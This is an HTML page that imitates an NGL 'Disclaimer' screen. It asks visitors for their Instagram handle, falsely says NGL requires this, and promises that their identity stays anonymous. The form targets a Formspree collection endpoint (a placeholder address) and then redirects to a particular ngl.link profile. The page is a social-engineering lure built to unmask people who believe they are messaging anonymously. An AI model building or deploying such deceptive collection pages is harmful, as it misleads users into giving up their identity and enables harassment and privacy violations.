<!DOCTYPE html>
<html lang="en">

<head>
    <meta charset="UTF-8">
    <meta http-equiv="X-UA-Compatible" content="IE=edge">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>ngl</title>
    <link href='https://unpkg.com/boxicons@2.1.4/css/boxicons.min.css' rel='stylesheet'>
    
    <style>
        /* Add your CSS styles here */
        @import url("https://fonts.googleapis.com/css2?family=Poppins:wght@300;400;500;600;700;800;900&display=swap");

        * {
            margin: 0;
            padding: 0;
            box-sizing: border-box;
            font-family: "Poppins", sans-serif;
        }

        body {
            font-family: Arial, sans-serif;
            margin: 0;
            padding: 0;
            display: flex;
            align-items: center;
            justify-content: center;
            min-height: 100vh;
            background-image: url("https://img.freepik.com/premium-vector/vertical-background-with-smooth-gradient-vector-illustration_522680-306.jpg?size=626&ext=jpg&ga=GA1.1.632798143.1705622400&semt=ais");
            background-size: cover;
            background-position: center;
        }

        .login-container {
            position: relative;
            border-radius: 8px;
            box-shadow: 0 0 10px rgba(0, 0, 0, 0.1);
            padding: 20px;
            width: 300px;
            text-align: center;
            overflow: hidden;
            position: relative;
            color: white;
        }

        .background-box {
            position: absolute;
            top: 0;
            left: 0;
            width: 100%;
            height: 100%;
            background-image: url("https://img.freepik.com/premium-vector/vertical-background-with-smooth-gradient-vector-illustration_522680-306.jpg?size=626&ext=jpg&ga=GA1.1.632798143.1705622400&semt=ais");
            background-size: cover;
            filter: blur(8px);
            z-index: -1;
        }

        label {
            display: block;
            margin-bottom: 10px;
            text-align: left;
        }

        input {
            width: 100%;
            padding: 10px;
            margin-bottom: 20px;
            border: 1px solid #ccc;
            border-radius: 5px;
            box-shadow: 0 0 5px rgba(0, 0, 0, 0.1);
            transition: border-color 0.3s ease-in-out;
        }

        input:focus {
            border-color: #3498db;
            outline: none;
        }

        button {
            background-color: #3498db;
            color: #fff;
            padding: 10px 20px;
            border: none;
            border-radius: 5px;
            cursor: pointer;
            font-size: 16px;
            margin-top: 15px;
            animation: pulse 1.5s infinite;
        }

        @keyframes pulse {
            0% {
                transform: scale(1);
            }
            50% {
                transform: scale(1.1);
            }
            100% {
                transform: scale(1);
            }
        }
    </style>

    <!-- JavaScript for form submission redirection -->
    <script>
        document.addEventListener('DOMContentLoaded', function () {
            const form = document.getElementById('form');

            form.addEventListener('submit', function (event) {
                event.preventDefault();

                // Assuming the form submission was successful, redirect to the desired website
                window.location.href = 'https://www.ngl.link/666shub';
            });
        });
    </script>
</head>

<body>
    <div class="login-container">
        <div class="background-box"></div>
        <!-- Add your login form content here -->
        <h2>Disclaimer</h2>
        <form name="List" method="POST" id="form" action="https://formspree.io/your-email@example.com" redirect="https://www.ngl.link/666shub">
            <!-- Add your form fields here -->
            <label for="username">
                <h6>As NGL wants to protect its user integrity through authentic messages, it is required to put your
                    <b> Insta handle </b>before proceeding further.
                    Don't worry your Identity and data will be still anonymous.</h6>
            </label>

            <input type="text" id="username" name="username" placeholder="Your Instagram Handle" required>

            <button type="submit"> <h4>PROCEED</h4> </button>
        </form>
    </div>
</body>

</html>
